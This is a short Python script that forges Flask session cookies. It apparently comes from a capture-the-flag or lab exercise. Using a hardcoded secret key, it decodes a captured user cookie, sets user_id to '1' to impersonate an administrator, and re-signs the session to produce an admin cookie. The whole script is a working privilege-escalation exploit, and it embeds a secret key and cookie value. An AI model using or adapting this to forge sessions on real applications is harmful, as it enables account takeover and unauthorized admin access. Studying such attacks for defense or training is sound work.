#!/usr/bin/env python3

import zlib
from flask.sessions import SecureCookieSessionInterface
from itsdangerous import base64_decode, URLSafeTimedSerializer

secret_key = '73e1f2c96e364f0cc3371c31927ed156'
user_cookie = '.eJwlz01qAzEMQOG7eJ2FJEu2nMsEWT-0FFqYSVald89AD_DBe7_tUUeeH-3-PF55a4_PaPfGlWVJOKMEMwfuxGFLREF8TDaaGJlsgHvpSIfqYqy-e6RSgHZF3KK-YkyACyIzWnV1hmXiC7MrgIqYzG2uFrTSuLMMlHZrfh71eP585ffV40lDKyo2Vvdi4JhkTimLnRSozKsWXu515vE_QbP9vQHyWj98.Eb45Rw.2E7fsQB1cpukW7JcF1g6EtrOSN0'

class SimpleSecureCookieSessionInterface(SecureCookieSessionInterface):
    def get_signing_serializer(self, secret_key):
        signer_kwargs = {
            'key_derivation': self.key_derivation,
            'digest_method': self.digest_method
        }
        return URLSafeTimedSerializer(
            secret_key,
            salt=self.salt,
            serializer=self.serializer,
            signer_kwargs=signer_kwargs
        )

class FlaskSessionCookieManager:
    @classmethod
    def decode(cls, secret_key, cookie):
        sscsi = SimpleSecureCookieSessionInterface()
        signingSerializer = sscsi.get_signing_serializer(secret_key)
        return signingSerializer.loads(cookie)

    @classmethod
    def encode(cls, secret_key, session):
        sscsi = SimpleSecureCookieSessionInterface()
        signingSerializer = sscsi.get_signing_serializer(secret_key)
        return signingSerializer.dumps(session)

# main
user_session = FlaskSessionCookieManager.decode(secret_key, user_cookie)
print(user_session)
admin_session = user_session
admin_session['user_id'] = '1'
print(admin_session)
print()
admin_cookie = FlaskSessionCookieManager.encode(secret_key, admin_session)
print(admin_cookie)
